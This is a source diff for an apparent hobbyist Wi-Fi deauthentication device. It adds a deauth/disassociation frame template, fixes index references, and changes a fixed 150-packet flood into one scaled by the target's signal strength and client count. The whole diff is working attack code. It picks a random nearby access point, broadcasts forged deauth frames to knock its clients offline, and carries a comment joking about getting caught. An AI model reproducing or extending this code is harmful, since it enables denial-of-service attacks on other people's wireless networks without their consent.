@@ -24,6 +24,16 @@ int Deauth::randomIndex;
  * 
 */
 
+uint8_t Deauth::deauthTemp[26] = {
+    /*  0 - 1  */ 0xC0, 0x00,                         // Type, subtype: c0 => deauth, a0 => disassociate
+    /*  2 - 3  */ 0x00, 0x00,                         // Duration (handled by the SDK)
+    /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Reciever MAC (To)
+    /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // Source MAC (From)
+    /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID MAC (From)
+    /* 22 - 23 */ 0x00, 0x00,                         // Fragment & squence number
+    /* 24 - 25 */ 0x01, 0x00                          // Reason code (1 = unspecified reason)
+};
+
 uint8_t Deauth::deauthFrame[26];
 uint8_t Deauth::disassociateFrame[26];
 uint8_t Deauth::broadcastAddr[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
@@ -123,7 +133,7 @@ void Deauth::select() {
 
     if (apCount > 0) {
         Deauth::randomIndex = random(apCount);
-        Deauth::randomAP = WiFi.SSID(randomIndex);
+        Deauth::randomAP = WiFi.SSID(Deauth::randomIndex);
     } else if (apCount < 0) {
         Serial.println("(;-;) I don't know what you did, but you screwed up!");
         Serial.println(" ");
@@ -163,6 +173,10 @@ void Deauth::select() {
     // clear out exisitng frame...
     std::fill(std::begin(Deauth::deauthFrame), std::end(Deauth::deauthFrame), 0);
     std::fill(std::begin(Deauth::disassociateFrame), std::end(Deauth::disassociateFrame), 0);
+
+    // copy template
+    std::copy(Deauth::deauthTemp, Deauth::deauthTemp + sizeof(Deauth::deauthTemp), Deauth::deauthFrame);
+    std::copy(Deauth::deauthTemp, Deauth::deauthTemp + sizeof(Deauth::deauthTemp), Deauth::disassociateFrame);
 
     Deauth::deauthFrame[0] = 0xC0; // type
     Deauth::deauthFrame[1] = 0x00; // subtype
@@ -205,6 +219,9 @@ void Deauth::select() {
         Deauth::deauthFrame[2] = 0x00; // duration (SDK takes care of that)
         Deauth::deauthFrame[3] = 0x00; // duration (SDK takes care of that)
 
+        // reason
+        Deauth::deauthFrame[24] = 0x01; // reason: unspecified
+
         std::copy(apBssid, apBssid + sizeof(apBssid), Deauth::deauthFrame + 4);
         std::copy(Deauth::broadcastAddr, Deauth::broadcastAddr + sizeof(Deauth::broadcastAddr), Deauth::deauthFrame + 10);
         std::copy(Deauth::broadcastAddr, Deauth::broadcastAddr + sizeof(Deauth::broadcastAddr), Deauth::deauthFrame + 16);
@@ -221,19 +238,19 @@ void Deauth::select() {
     }
 
     Serial.print("('-') Full AP SSID: ");
-    Serial.println(WiFi.SSID(randomIndex));
+    Serial.println(WiFi.SSID(Deauth::randomIndex));
     Display::cleanDisplayFace("('-')");
-    Display::attachSmallText("Full AP SSID: " + (String) WiFi.SSID(randomIndex));  
+    Display::attachSmallText("Full AP SSID: " + (String) WiFi.SSID(Deauth::randomIndex));  
 
     Serial.print("('-') AP Encryption: ");
-    Serial.println(WiFi.encryptionType(randomIndex));
+    Serial.println(WiFi.encryptionType(Deauth::randomIndex));
     Display::cleanDisplayFace("('-')");
-    Display::attachSmallText("AP Encryption: " + (String) WiFi.encryptionType(randomIndex));  
+    Display::attachSmallText("AP Encryption: " + (String) WiFi.encryptionType(Deauth::randomIndex));  
 
     Serial.print("('-') AP RSSI: ");
-    Serial.println(WiFi.RSSI(randomIndex));
+    Serial.println(WiFi.RSSI(Deauth::randomIndex));
     Display::cleanDisplayFace("('-')");
-    Display::attachSmallText("AP RSSI: " + (String) WiFi.RSSI(randomIndex));
+    Display::attachSmallText("AP RSSI: " + (String) WiFi.RSSI(Deauth::randomIndex));
 
     Serial.print("('-') AP BSSID: ");
     printMac(apBssid);
@@ -241,14 +258,14 @@ void Deauth::select() {
     Display::attachSmallText("AP BSSID: " + (String) Deauth::printMacStr(apBssid));    
 
     Serial.print("('-') AP Channel: ");
-    Serial.println(WiFi.channel(randomIndex));
+    Serial.println(WiFi.channel(Deauth::randomIndex));
     Display::cleanDisplayFace("('-')");
-    Display::attachSmallText("AP Channel: " + (String) WiFi.channel(randomIndex));
+    Display::attachSmallText("AP Channel: " + (String) WiFi.channel(Deauth::randomIndex));
 
     Serial.print("('-') AP Hidden?: ");
-    Serial.println(WiFi.isHidden(randomIndex));
+    Serial.println(WiFi.isHidden(Deauth::randomIndex));
     Display::cleanDisplayFace("('-')");
-    Display::attachSmallText("AP Hidden?: " + (String) WiFi.isHidden(randomIndex));
+    Display::attachSmallText("AP Hidden?: " + (String) WiFi.isHidden(Deauth::randomIndex));
     Serial.println(" ");
     delay(1000);
 }
@@ -298,8 +315,20 @@ void Deauth::start() {
     int packets = 0;
     unsigned long startTime = millis();
 
+    // packet calculation
+    int basePacketCount = 150;
+    int rssi = WiFi.RSSI(Deauth::randomIndex);
+    int numDevices = WiFi.softAPgetStationNum();
+
+    int packetCount = basePacketCount + (numDevices * 10);
+    if (rssi > -50) {
+        packetCount /= 2;  // strong signal
+    } else if (rssi < -80) {
+        packetCount *= 2;  // weak signal
+    }
+
     // send the deauth 150 times(ur cooked if they find out)
-    for (int i = 0; i < 150; ++i) {
+    for (int i = 0; i < packetCount; ++i) {
         if (Deauth::send(const_cast<uint8_t*>(deauthFrame), deauthFrameSize, 0) || Deauth::send(const_cast<uint8_t*>(disassociateFrame), disassociateFrameSize, 0)) {
             packets++;
             float pps = packets / (float)(millis() - startTime) * 1000;
